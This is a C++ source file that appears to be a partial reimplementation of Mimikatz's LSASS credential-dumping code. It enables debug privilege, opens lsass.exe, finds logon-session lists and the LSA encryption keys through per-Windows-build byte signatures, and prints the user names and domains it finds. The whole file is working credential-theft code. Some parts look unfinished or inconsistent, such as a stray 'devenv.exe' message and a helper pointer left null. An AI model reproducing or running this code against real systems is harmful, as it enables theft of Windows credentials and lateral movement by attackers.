#include<iostream>
#include"header/process.h"

using namespace std;
/**全局变量声明*/
DWORD MIMIKATZ_NT_MAJOR_VERSION, MIMIKATZ_NT_MINOR_VERSION, MIMIKATZ_NT_BUILD_NUMBER;
KULL_M_MEMORY_HANDLE KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = { L"msv", kuhl_m_sekurlsa_enum_logon_callback_msv, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_package = { L"credman", kuhl_m_sekurlsa_enum_logon_callback_credman, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };

PLIST_ENTRY LogonSessionList = NULL;
PULONG LogonSessionListCount = NULL;
PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
    &kuhl_m_sekurlsa_msv_package,
    & kuhl_m_sekurlsa_credman_package,
};


BYTE PTRN_WIN5_LogonSessionList[] = { 0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8 };
BYTE PTRN_WN60_LogonSessionList[] = { 0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84 };
BYTE PTRN_WN61_LogonSessionList[] = { 0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84 };
BYTE PTRN_WN63_LogonSessionList[] = { 0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05 };
BYTE PTRN_WN6x_LogonSessionList[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
BYTE PTRN_WN1703_LogonSessionList[] = { 0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
BYTE PTRN_WN1803_LogonSessionList[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
BYTE PTRN_WN11_LogonSessionList[] = { 0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };

KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
    {KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4,   0}},
    {KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4, -45}},
    {KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_LogonSessionList),	PTRN_WN60_LogonSessionList},	{0, NULL}, {21,  -4}},
    {KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
    {KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
    {KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
    {KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
    {KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}},
    {KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
    {KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
    {KULL_M_WIN_BUILD_2022,		{sizeof(PTRN_WN11_LogonSessionList),	PTRN_WN11_LogonSessionList},	{0, NULL}, {24,  -4}},
};


/*nt6*/
BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d };
BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d };
BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // InitializationVector, h3DesKey, hAesKey
    {KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {63, -69, 25}},
    {KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {59, -61, 25}},
    {KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
    {KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {61, -73, 16}},
    {KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {67, -89, 16}},
};
BYTE InitializationVector[16];
KIWI_BCRYPT_GEN_KEY k3Des, kAes;

//const KUHL_M_SEKURLSA_LOCAL_HELPER lsassLocalHelpers[] = {
//#if !defined(_M_ARM64)
//    {kuhl_m_sekurlsa_nt5_init,	kuhl_m_sekurlsa_nt5_clean,	kuhl_m_sekurlsa_nt5_acquireKeys,	&kuhl_m_sekurlsa_nt5_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory},
//#endif
//    {kuhl_m_sekurlsa_nt6_init,	kuhl_m_sekurlsa_nt6_clean,	kuhl_m_sekurlsa_nt6_acquireKeys,	&kuhl_m_sekurlsa_nt6_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt6_pLsaUnprotectMemory},
//};
/**全局变量声明  end*/

int main(int args[]) {
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hData = NULL;
    DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
    DWORD pid;
    KUHL_M_SEKURLSA_CONTEXT cLsass = { NULL, {0, 0, 0} };
    KULL_M_MEMORY_TYPE Type = KULL_M_MEMORY_TYPE_PROCESS;
    KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_lsa_package, kuhl_m_sekurlsa_dpapi_svc_package;

    GetSysInfo();
    cout << MIMIKATZ_NT_MAJOR_VERSION << endl;
    kuhl_m_privilege_simple(20);
    qureyProcessId("lsass.exe",&pid);
    hData = OpenProcess(processRights, FALSE, pid); //获取打开的句柄
    if (hData && hData != INVALID_HANDLE_VALUE)  //打开句柄成功
    {

        if (kull_m_memory_open(Type, hData, &cLsass.hLsassMem)) {
            cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
            cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
            cLsass.osContext.BuildNumber = MIMIKATZ_NT_BUILD_NUMBER;
        }
        //lsassLocalHelper = &lsassLocalHelpers[1];
        if (NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
        {

            kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
            if (kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
            {
                status = kuhl_m_sekurlsa_nt6_acquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
                if (!NT_SUCCESS(status))
                    printf_s("Key import\n");
            }
        }
        
    }

    KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
    ULONG nbListes = 1, i;
    PVOID pStruct;
    KULL_M_MEMORY_ADDRESS securityStruct, data = { &nbListes, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE }, aBuffer = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
    BOOL retCallback = TRUE;
    const KUHL_M_SEKURLSA_ENUM_HELPER* helper;
    const KUHL_M_SEKURLSA_LOCAL_HELPER* lsassLocalHelper = NULL;
    const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
        {sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
    };
    sessionData.cLsass = &cLsass;
    sessionData.lsassLocalHelper = lsassLocalHelper;

    /*if (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_2K3)
        helper = &lsassEnumHelpers[0];
    else if (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_VISTA)
        helper = &lsassEnumHelpers[1];
    else if (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_7)
        helper = &lsassEnumHelpers[2];
    else if (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_8)
        helper = &lsassEnumHelpers[3];
    else if (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
        helper = &lsassEnumHelpers[5];
    else*/
        helper = &lsassEnumHelpers[0];

    if ((cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
        helper++; // yeah, really, I do that =)

    securityStruct.hMemory = cLsass.hLsassMem;
    if (securityStruct.address = LogonSessionListCount)
        kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));

    for (i = 0; i < nbListes; i++)
    {
        securityStruct.address = &LogonSessionList[i];
        data.address = &pStruct;
        data.hMemory = &KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
        if (aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
        {
            kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID));
            
                data.address = pStruct;
                data.hMemory = securityStruct.hMemory;

                while ((data.address != securityStruct.address) && retCallback)
                {
                    if (kull_m_memory_copy(&aBuffer, &data, helper->tailleStruct))
                    {
                        sessionData.LogonId = (PLUID)((PBYTE)aBuffer.address + helper->offsetToLuid);
                        sessionData.LogonType = *((PULONG)((PBYTE)aBuffer.address + helper->offsetToLogonType));
                        sessionData.Session = *((PULONG)((PBYTE)aBuffer.address + helper->offsetToSession));
                        sessionData.UserName = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToUsername);
                        sessionData.LogonDomain = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToDomain);
                        sessionData.pCredentials = *(PVOID*)((PBYTE)aBuffer.address + helper->offsetToCredentials);
                        sessionData.pSid = *(PSID*)((PBYTE)aBuffer.address + helper->offsetToPSid);
                        sessionData.pCredentialManager = *(PVOID*)((PBYTE)aBuffer.address + helper->offsetToCredentialManager);
                        sessionData.LogonTime = *((PFILETIME)((PBYTE)aBuffer.address + helper->offsetToLogonTime));
                        sessionData.LogonServer = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToLogonServer);

                        kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
                        cout << (sessionData.UserName) << endl;
                       
                        kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
                        cout << sessionData.LogonDomain << endl;
                        kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
                        kull_m_process_getSid(&sessionData.pSid, cLsass.hLsassMem);

                        if (sessionData.UserName->Buffer)
                            LocalFree(sessionData.UserName->Buffer);
                        if (sessionData.LogonDomain->Buffer)
                            LocalFree(sessionData.LogonDomain->Buffer);
                        if (sessionData.LogonServer->Buffer)
                            LocalFree(sessionData.LogonServer->Buffer);
                        if (sessionData.pSid)
                            LocalFree(sessionData.pSid);

                        data.address = ((PLIST_ENTRY)(aBuffer.address))->Flink;
                    }
                    else
                        break;
                }
            
        }
    }

    std::cout << "pid of devenv.exe: " << pid << std::endl;
    return 0;
}



